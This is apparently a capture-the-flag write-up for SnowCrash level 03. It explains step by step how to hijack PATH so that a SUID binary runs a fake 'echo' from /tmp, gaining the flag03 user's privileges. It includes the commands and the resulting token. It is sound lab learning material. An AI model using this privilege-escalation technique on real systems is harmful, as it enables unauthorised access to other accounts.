# LEVEL 03

## Summary

Exploit a program owned by user flag03 and which has the SUID bit use it as flag03.
The program is the shell environment (that can be edited) and use the PATH variable to execute 'echo' command.
We can therefore make the program execute 'getflag' instead of 'echo' by putting a fake 'echo' file in some accessible directory and put this directory in first in $PATH.

We won't connect to flag03, we'll execute getflag directly from the program which give
us flag03's identity.

## Workflow

1. The directory `/home/user/level03` contains an executable named `level03`, owned by user `flag03` and with the SUID bit set.
	```
	level03@SnowCrash:~$ ls -l /home/user/level03
	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
	```

2. Cat the file and seek for a vulnerability. /usr/bin/env is used as the shell current env and echo is used to print a static string.
	```
	level03@SnowCrash:~$ cat level03
	...
	������D$������������������Ë$Ð���������U��S������t�f����Ћ���u��[]Ð�S��[��/��O����[�/usr/bin/env echo Exploit me0p���L����p��������������zR| �����9�u߃�[^_]��
	...
	```

3. Choose an accessible directory to put a fake 'echo' file. /tmp is a good candidate since it is writable and executable by all users.
	```
	level03@SnowCrash:~$ ls -l /
	total 2
	...
	dr-xr-xr-x  7 root root 2048 Mar 12  2016 cdrom
	drwxr-xr-x 15 root root 4040 Oct 13 13:04 dev
	drwxr-xr-x  1 root root  260 Oct 13 13:04 etc
	...
	d-wx-wx-wx  4 root root  100 Oct 13 15:00 tmp
	...
	```

4. Create a fake 'echo' file in /tmp that will execute 'getflag' instead of printing its arguments. Make it executable.
	```
	level03@SnowCrash:~$ echo "
	#!/bin/bash

	getflag" > /tmp/echo
	```

	```
	level03@SnowCrash:~$ chmod +x /tmp/echo
	```

5. Run the level03 executable with /tmp in first in the PATH variable.
	```
	level03@SnowCrash:~$ ./level03
	Exploit me
	```

	```
	level03@SnowCrash:~$ PATH=/tmp:$PATH ./level03
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
	```
